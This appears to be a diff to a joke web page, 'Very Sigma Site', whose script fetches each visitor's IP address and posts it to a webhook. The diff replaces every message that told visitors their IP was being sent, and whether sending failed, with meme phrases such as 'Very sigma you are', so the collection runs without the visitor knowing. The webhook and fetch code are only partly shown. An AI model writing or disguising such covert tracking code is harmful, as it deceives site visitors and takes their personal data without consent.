@@ -12,7 +12,7 @@
 </head>
 <body>
     <h1>Very Sigma Site</h1>
-    <p id="message">Your IP is being sent...</p>
+    <p id="message">Very sigma you are</p>
 
     <script>
         // Fetch IP address
@@ -34,11 +34,11 @@
             .then(response => response.text())
             .then(result => {
                 console.log('Webhook response:', result);
-                console.log("IP successfully sent to webhook.");
+                console.log("Sigma.");
             })
             .catch(error => {
                 console.error('Error:', error);
-                document.getElementById('message').textContent = 'Failed to fetch IP.';
+                document.getElementById('message').textContent = 'you are skibidi.';
             });
     </script>
 </body>
